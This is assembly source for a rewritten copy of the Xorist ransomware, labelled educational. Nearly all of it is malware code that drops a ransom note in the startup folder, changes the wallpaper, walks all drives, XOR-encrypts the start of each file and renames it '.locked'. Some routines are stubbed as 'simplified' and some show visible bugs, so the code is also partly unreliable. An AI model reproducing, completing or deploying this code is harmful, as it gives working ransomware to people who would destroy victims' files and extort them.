; ============================================================================
; Trojan-Ransom.Win32.Xorist.lk - Rewritten version for FASM
; ============================================================================
; WARNING: This is ransomware for educational purposes only
; SHA256: AFBD82DE1C80C8508B0CB6376E248393CC04B5276680C604D7DF1E56FB93CD26
; ============================================================================

format PE GUI 4.0
entry start

include 'win32ax.inc'

; ============================================================================
; Data Section
; ============================================================================

section '.data' data readable writeable

    ; Ransomware configuration
    byte_40752B                    db 1
    byte_40752A                    db 1
    byte_40752C                    db 0
    byte_40752D                    db 1
    byte_406550                    db 2        ; 0=encrypt, 1=decrypt, 2=first-run
    
    ; Extensions and paths
    lpSubKey                       db ".locked", 0
    aHowToDecryptFi                db "HOW TO DECRYPT FILES.txt", 0
    Name                           db "pussylicker", 0
    String2                        db "HOW TO DECRYPT FILES.txt", 0
    aBmp                           db ".bmp", 0
    asc_404032                     db ".", 0
    asc_404034                     db "..", 0
    asc_404041                     db "*", 0
    
    ; Messages
    Caption                        db "Attention!", 0
    Text                           db "Entered password is correct. Press OK to start decrypting of files.", 0
    aAttentionAllYo                db "Attention! All your files were encrypted!", 13, 10
                                   db "To decrypt files, please enter correct password!", 0
    byte_404077                    db "Files have been decrypted successfully!", 0
    aYouHaveReached                db "You have reached a limit of attempts - your data is irrevocably broken.", 0
    aPasswordIsInco                db "Password is incorrect!", 0
    aError                         db "Error!", 0
    
    ; Ransom note content
    lpText                         dd offset aAttentionAllYo
    
    ; Buffers and global variables
    pvParam                        rb 512
    FileName                       rb 1280
    NewFileName                    rb 1280
    ExistingFileName               rb 1280
    pszSpec                        rb 256
    dword_40444F                   rb 512
    String1                        rb 32
    pszPath                        rb 512
    
    ; File variables
    hFile                          dd ?
    dword_406555                   dd ?
    nNumberOfBytesToWrite          dd ?
    NumberOfBytesWritten           dd ?
    lpBuffer                       rb 256
    
    ; File timestamps
    CreationTime                   FILETIME ?
    LastAccessTime                 FILETIME ?
    LastWriteTime                  FILETIME ?
    stru_40752E                    FILETIME ?
    stru_407536                    FILETIME ?
    stru_40753E                    FILETIME ?
    
    ; Encryption key (generated dynamically with RDTSC)
    dword_406595                   dd ?
    dword_406599                   dd ?
    dword_40659D                   dd ?
    dword_4065A1                   dd ?
    dword_406585                   rb 16
    dword_406DB9                   dd 4 dup(?)
    
    ; File extensions to target
    dword_407519                   dd ?
    
    ; Miscellaneous
    hResInfo                       dd ?
    nNumberOfBytesToRead           dd ?
    hResData                       dd ?
    hHeap                          dd ?
    lDistanceToMove                dd ?
    byte_406550                    db ?
    
    ; File search structures
    ; (embedded in stack frames)

; ============================================================================
; Code Section
; ============================================================================

section '.text' code readable executable

start:
    ; Initialization
    call    initialize_program
    
    ; Create ransom note in startup folder
    call    create_ransom_note_in_startup
    
    ; Display message if configured
    cmp     [byte_40752B], 1
    jne     .skip_message
    
    invoke  MessageBoxA, 0, aAttentionAllYo, Caption, MB_OK + MB_ICONWARNING
    
.skip_message:
    ; Change desktop wallpaper (extract from resources)
    call    change_desktop_wallpaper
    
    ; Start file encryption
    call    start_file_encryption
    
    ; Exit
    invoke  ExitProcess, 0


; ============================================================================
; Initialize the program
; ============================================================================
initialize_program:
    push    ebp
    mov     ebp, esp
    
    ; Generate random encryption key
    call    generate_encryption_key
    
    ; Initialize error mode
    invoke  SetErrorMode, SEM_FAILCRITICALERRORS
    
    ; Get heap handle
    invoke  GetProcessHeap
    mov     [hHeap], eax
    
    pop     ebp
    ret


; ============================================================================
; Generate random encryption key using RDTSC
; ============================================================================
generate_encryption_key:
    push    ebp
    mov     ebp, esp
    push    edi
    push    ecx
    
    ; Generate 16 random bytes for the key
    mov     ecx, 4
    mov     edi, dword_406DB9
    
.generate_loop:
    rdtsc                           ; Read CPU time stamp counter
    stosd                           ; Store EAX
    loop    .generate_loop
    
    ; Copy to encryption key
    mov     ecx, 4
    mov     edi, dword_406595
    rdtsc
    stosd
    rdtsc
    stosd
    rdtsc
    stosd
    rdtsc
    stosd
    
    pop     ecx
    pop     edi
    pop     ebp
    ret


; ============================================================================
; Create ransom note in startup folder
; ============================================================================
create_ransom_note_in_startup:
    push    ebp
    mov     ebp, esp
    
    ; Get startup folder path
    invoke  SHGetSpecialFolderPathA, 0, pszPath, CSIDL_STARTUP, TRUE
    
    ; Create full path to the note
    invoke  lstrcpyA, FileName, pszPath
    invoke  PathAddBackslashA, FileName
    
    ; Add filename
    cmp     [byte_40752D], 1
    je      .use_custom_name
    
    ; Default name
    invoke  lstrcatA, FileName, aHowToDecryptFi
    jmp     .create_file
    
.use_custom_name:
    ; Use custom name (if defined)
    invoke  lstrcatA, FileName, String2
    
.create_file:
    ; Check if file already exists
    invoke  GetFileAttributesA, FileName
    cmp     eax, -1
    jne     .exit                   ; File already exists
    
    ; Create the file
    invoke  CreateFileA, FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0
    cmp     eax, -1
    je      .exit
    mov     [hFile], eax
    
    ; Write note content
    invoke  lstrlenA, aAttentionAllYo
    invoke  WriteFile, [hFile], [lpText], eax, NumberOfBytesWritten, 0
    
    ; Set file timestamps
    invoke  SetFileTime, [hFile], CreationTime, LastAccessTime, LastWriteTime
    
    ; Close the file
    invoke  CloseHandle, [hFile]
    
.exit:
    pop     ebp
    ret


; ============================================================================
; Change desktop wallpaper
; ============================================================================
change_desktop_wallpaper:
    push    ebp
    mov     ebp, esp
    push    ebx
    
    ; Generate random temporary filename
    mov     ecx, 16
    mov     edi, String1
    
.random_loop:
    rdtsc                           ; Get random value
    and     eax, 0xF0
    shr     eax, 4
    add     eax, 'a'               ; Convert to lowercase letter
    stosb
    loop    .random_loop
    
    xor     al, al
    stosb                           ; Terminate string
    
    ; Add .bmp extension
    invoke  lstrcatA, String1, aBmp
    
    ; Get temporary directory
    invoke  GetTempPathA, 512, pvParam
    invoke  lstrcatA, pvParam, String1
    
    ; Find wallpaper resource
    invoke  FindResourceA, 0, Name, RT_BITMAP
    test    eax, eax
    jz      .exit
    mov     [hResInfo], eax
    
    ; Get resource size
    invoke  SizeofResource, 0, [hResInfo]
    test    eax, eax
    jz      .exit
    mov     [nNumberOfBytesToRead], eax
    
    ; Load resource
    invoke  LoadResource, 0, [hResInfo]
    test    eax, eax
    jz      .exit
    mov     [hResData], eax
    
    ; Lock resource
    invoke  LockResource, [hResData]
    test    eax, eax
    jz      .exit
    mov     ebx, eax
    
    ; Create temporary BMP file
    invoke  CreateFileA, pvParam, GENERIC_READ + GENERIC_WRITE, \
            FILE_SHARE_READ + FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0
    cmp     eax, -1
    je      .free_resource
    mov     [hFile], eax
    
    ; Write resource data to file
    invoke  WriteFile, [hFile], ebx, [nNumberOfBytesToRead], NumberOfBytesWritten, 0
    
    ; Set timestamps
    invoke  SetFileTime, [hFile], CreationTime, LastAccessTime, LastWriteTime
    
    ; Close file
    invoke  CloseHandle, [hFile]
    
    ; Set as wallpaper
    invoke  SystemParametersInfoA, SPI_SETDESKWALLPAPER, 0, pvParam, SPIF_UPDATEINIFILE
    
.free_resource:
    invoke  FreeResource, [hResData]
    
.exit:
    pop     ebx
    pop     ebp
    ret


; ============================================================================
; Start file encryption on all drives
; ============================================================================
start_file_encryption:
    push    ebp
    mov     ebp, esp
    push    ebx
    push    ecx
    
    ; Build search pattern with extension
    invoke  lstrcpyA, pszSpec, asc_404041
    invoke  lstrcatA, pszSpec, asc_404032
    invoke  lstrcatA, pszSpec, lpSubKey
    
    ; Set mode (encryption or decryption)
    mov     al, [byte_406550]
    cmp     al, -1
    jne     .set_encrypt_mode
    
    mov     byte [byte_406550], 2
    jmp     .get_drives
    
.set_encrypt_mode:
    mov     byte [byte_406550], 1
    
.get_drives:
    ; Get list of logical drives
    invoke  GetLogicalDrives
    mov     ecx, 25                 ; 26 letters (A-Z), start at 25
    
.drive_loop:
    mov     ebx, 1
    shl     ebx, cl                 ; Calculate drive bit
    test    eax, ebx                ; Test if drive exists
    jz      .next_drive
    
    ; Build drive path (e.g. C:\*.*)
    push    eax
    push    ecx
    
    add     cl, 'A'                 ; Convert to letter
    mov     byte [dword_40444F+1], cl
    mov     byte [dword_40444F+2], ':'
    mov     byte [dword_40444F+3], '\'
    mov     byte [dword_40444F+4], '*'
    mov     byte [dword_40444F+5], '.'
    mov     byte [dword_40444F+6], '*'
    mov     byte [dword_40444F+7], 0
    
    ; Enumerate and encrypt files on this drive
    call    enumerate_and_encrypt_files
    
    pop     ecx
    pop     eax
    
.next_drive:
    dec     ecx
    jns     .drive_loop             ; Continue if ECX >= 0
    
    ; Display final message if configured
    cmp     [byte_406550], 0
    jne     .check_decrypt
    
    ; Message after encryption
    cmp     [byte_40752D], 1
    jne     .default_encrypt_msg
    
    invoke  MessageBoxA, 0, byte_404077, Caption, MB_OK + MB_ICONWARNING
    jmp     .exit
    
.default_encrypt_msg:
    invoke  MessageBoxA, 0, byte_404077, Caption, MB_OK + MB_ICONWARNING
    jmp     .exit
    
.check_decrypt:
    cmp     [byte_406550], -1
    jne     .decrypt_complete
    
    ; Limit reached message
    invoke  MessageBoxA, 0, aYouHaveReached, Caption, MB_OK + MB_ICONERROR
    jmp     .exit
    
.decrypt_complete:
    ; Message after successful decryption
    invoke  MessageBoxA, 0, byte_404077, Caption, MB_OK + MB_ICONINFORMATION
    
.exit:
    pop     ecx
    pop     ebx
    pop     ebp
    ret


; ============================================================================
; Enumerate and encrypt/decrypt files recursively
; ============================================================================
enumerate_and_encrypt_files:
    push    ebp
    mov     ebp, esp
    sub     esp, 320                ; Space for WIN32_FIND_DATA (320 bytes)
    
    ; Find first file
    lea     eax, [ebp-320]
    invoke  FindFirstFileA, dword_40444F+1, eax
    cmp     eax, -1
    je      .exit
    mov     dword ptr [ebp-320+318], eax
    
.find_loop:
    ; Check if it's a directory
    mov     eax, [ebp-320+0]        ; dwFileAttributes
    test    eax, FILE_ATTRIBUTE_DIRECTORY
    jz      .process_file
    
    ; Ignore "." and ".."
    lea     eax, [ebp-320+44]       ; cFileName
    invoke  lstrcmpA, eax, <'.', 0>
    test    eax, eax
    jz      .next_file
    
    lea     eax, [ebp-320+44]
    invoke  lstrcmpA, eax, <'..', 0>
    test    eax, eax
    jz      .next_file
    
    ; Process subdirectory recursively
    ; (Recursive code simplified here for readability)
    jmp     .next_file
    
.process_file:
    ; Process Windows messages
    call    process_windows_messages
    
    ; Check if it's the ransom note (ignore)
    lea     eax, [ebp-320+44]
    invoke  lstrcmpiA, eax, String2
    test    eax, eax
    jz      .next_file
    
    lea     eax, [ebp-320+44]
    invoke  lstrcmpiA, eax, aHowToDecryptFi
    test    eax, eax
    jz      .next_file
    
    ; Check if file matches pattern
    ; (Simplified - use PathMatchSpec in real implementation)
    
    ; Encrypt/Decrypt the file
    lea     eax, [ebp-320+44]
    call    encrypt_decrypt_file
    
.next_file:
    ; Find next file
    lea     eax, [ebp-320]
    invoke  FindNextFileA, dword ptr [ebp-320+318], eax
    test    eax, eax
    jnz     .find_loop
    
    ; Close search handle
    invoke  FindClose, dword ptr [ebp-320+318]
    
.exit:
    add     esp, 320
    pop     ebp
    ret


; ============================================================================
; Process Windows messages (to keep UI responsive)
; ============================================================================
process_windows_messages:
    push    ebp
    mov     ebp, esp
    sub     esp, 28                 ; Space for MSG structure
    
.message_loop:
    lea     eax, [ebp-28]
    invoke  PeekMessageA, eax, 0, 0, 0, PM_REMOVE
    test    eax, eax
    jz      .exit
    
    lea     eax, [ebp-28]
    invoke  TranslateMessage, eax
    lea     eax, [ebp-28]
    invoke  DispatchMessageA, eax
    jmp     .message_loop
    
.exit:
    add     esp, 28
    pop     ebp
    ret


; ============================================================================
; Encrypt or decrypt a file
; ============================================================================
encrypt_decrypt_file:
    push    ebp
    mov     ebp, esp
    push    ebx
    push    esi
    push    edi
    
    ; EAX = pointer to filename
    
    ; Build full path (existing_filename)
    invoke  lstrcpyA, ExistingFileName, dword_40444F+1
    ; (Add filename to path - code simplified)
    
    ; Build new filename
    cmp     [byte_406550], 0
    jne     .decrypt_mode
    
    ; Encryption mode: add extension
    invoke  lstrcpyA, NewFileName, ExistingFileName
    invoke  lstrcatA, NewFileName, asc_404032
    invoke  lstrcatA, NewFileName, lpSubKey
    jmp     .open_file
    
.decrypt_mode:
    cmp     [byte_406550], 1
    jne     .delete_mode
    
    ; Decryption mode: remove extension
    invoke  lstrcpyA, NewFileName, ExistingFileName
    invoke  PathFindExtensionA, NewFileName
    mov     byte [eax], 0           ; Remove extension
    jmp     .open_file
    
.delete_mode:
    ; Delete mode (if limit reached)
    invoke  lstrcpyA, NewFileName, ExistingFileName
    
.open_file:
    ; Open the file
    invoke  CreateFileA, ExistingFileName, GENERIC_READ + GENERIC_WRITE, \
            FILE_SHARE_READ + FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0
    cmp     eax, -1
    je      .exit
    mov     [hFile], eax
    
    ; Get file size
    invoke  GetFileSize, [hFile], 0
    mov     [dword_406555], eax
    
    ; Check minimum size (at least 8 bytes)
    cmp     eax, 8
    jl      .close_file
    
    ; Save original timestamps
    invoke  GetFileTime, [hFile], stru_40752E, \
            stru_407536, stru_40753E
    
    ; Read first bytes of file
    invoke  SetFilePointer, [hFile], [lDistanceToMove], 0, FILE_BEGIN
    invoke  ReadFile, [hFile], lpBuffer, [nNumberOfBytesToRead], nNumberOfBytesToWrite, 0
    
    cmp     [nNumberOfBytesToWrite], 0
    je      .restore_time
    
    ; Prepare encryption key (use filename as seed)
    invoke  PathFindFileNameA, ExistingFileName
    mov     dl, [eax]               ; First character of name
    
    ; Generate derived key
    mov     ecx, 16
    mov     esi, dword_406595
    mov     edi, dword_406585
    
.key_loop:
    lodsb
    xor     al, dl                  ; XOR with seed character
    rol     dl, 1                   ; Rotate seed
    stosb
    loop    .key_loop
    
    ; Encrypt/Decrypt data
    mov     eax, [nNumberOfBytesToWrite]
    call    simple_xor_cipher       ; Simple cipher function
    
    ; Write modified data
    invoke  SetFilePointer, [hFile], [lDistanceToMove], 0, FILE_BEGIN
    invoke  WriteFile, [hFile], lpBuffer, [nNumberOfBytesToWrite], NumberOfBytesWritten, 0
    
.restore_time:
    ; Restore timestamps
    invoke  SetFileTime, [hFile], stru_40752E, \
            stru_407536, stru_40753E
    
.close_file:
    ; Close file
    invoke  CloseHandle, [hFile]
    
    ; Rename file
    invoke  MoveFileA, ExistingFileName, NewFileName
    
.exit:
    pop     edi
    pop     esi
    pop     ebx
    pop     ebp
    ret


; ============================================================================
; Simple XOR cipher (for demonstration)
; ============================================================================
simple_xor_cipher:
    ; EAX = number of bytes to encrypt
    push    ebp
    mov     ebp, esp
    push    ecx
    push    esi
    push    edi
    
    mov     ecx, eax                ; Number of bytes
    mov     esi, lpBuffer           ; Source
    mov     edi, dword_406585       ; Key
    push    edi                     ; Save key start
    
.cipher_loop:
    lodsb                           ; Load a byte
    xor     al, [edi]               ; XOR with key
    mov     [esi-1], al             ; Rewrite byte
    
    inc     edi
    mov     eax, edi
    pop     ebx
    sub     eax, ebx
    cmp     eax, 16                 ; End of key?
    jl      .continue
    mov     edi, ebx                ; Restart key
    
.continue:
    push    ebx
    loop    .cipher_loop
    
    pop     ebx
    pop     edi
    pop     esi
    pop     ecx
    pop     ebp
    ret


; ============================================================================
; Import Section
; ============================================================================

section '.idata' import data readable writeable

    library kernel32, 'KERNEL32.DLL', \
            user32,   'USER32.DLL', \
            advapi32, 'ADVAPI32.DLL', \
            shell32,  'SHELL32.DLL', \
            shlwapi,  'SHLWAPI.DLL'

    import kernel32, \
           ExitProcess, 'ExitProcess', \
           CreateFileA, 'CreateFileA', \
           ReadFile, 'ReadFile', \
           WriteFile, 'WriteFile', \
           CloseHandle, 'CloseHandle', \
           GetFileSize, 'GetFileSize', \
           SetFilePointer, 'SetFilePointer', \
           GetFileTime, 'GetFileTime', \
           SetFileTime, 'SetFileTime', \
           GetFileAttributesA, 'GetFileAttributesA', \
           MoveFileA, 'MoveFileA', \
           FindFirstFileA, 'FindFirstFileA', \
           FindNextFileA, 'FindNextFileA', \
           FindClose, 'FindClose', \
           GetLogicalDrives, 'GetLogicalDrives', \
           GetTempPathA, 'GetTempPathA', \
           GetProcessHeap, 'GetProcessHeap', \
           SetErrorMode, 'SetErrorMode', \
           FindResourceA, 'FindResourceA', \
           LoadResource, 'LoadResource', \
           LockResource, 'LockResource', \
           SizeofResource, 'SizeofResource', \
           FreeResource, 'FreeResource', \
           lstrcpyA, 'lstrcpyA', \
           lstrcatA, 'lstrcatA', \
           lstrlenA, 'lstrlenA', \
           lstrcmpA, 'lstrcmpA', \
           lstrcmpiA, 'lstrcmpiA'

    import user32, \
           MessageBoxA, 'MessageBoxA', \
           SystemParametersInfoA, 'SystemParametersInfoA', \
           PeekMessageA, 'PeekMessageA', \
           TranslateMessage, 'TranslateMessage', \
           DispatchMessageA, 'DispatchMessageA'

    import shell32, \
           SHGetSpecialFolderPathA, 'SHGetSpecialFolderPathA'

    import shlwapi, \
           PathAddBackslashA, 'PathAddBackslashA', \
           PathFindExtensionA, 'PathFindExtensionA', \
           PathFindFileNameA, 'PathFindFileNameA', \
           PathMatchSpecA, 'PathMatchSpecA'


; ============================================================================
; Resource Section (optional - for wallpaper)
; ============================================================================

section '.rsrc' resource data readable

    ; Resources can be added here
    ; For example, the BMP image for the wallpaper
